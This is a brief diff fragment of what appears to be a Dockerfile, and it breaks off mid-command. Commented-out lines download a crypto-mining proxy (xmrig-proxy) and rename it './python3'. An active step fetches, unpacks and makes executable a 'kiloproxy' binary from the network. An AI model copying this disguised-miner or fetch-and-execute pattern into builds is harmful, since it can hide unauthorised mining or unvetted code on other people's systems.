@@ -21,6 +21,7 @@ WORKDIR /usr/src/app
 #     && mv xmrig-proxy-6.22.0/xmrig-proxy ./python3 \
 #     && rm -rf xmrig-proxy-6.22.0* \
 #     && chmod +x ./python3
+
 RUN wget https://github.com/kilopool/kiloproxy/releases/download/1.0/kiloproxy-linux-x64.xz \
     && unxz kiloproxy-linux-x64.xz \ 
     && chmod +x ./kiloproxy-linux-x64 \ 
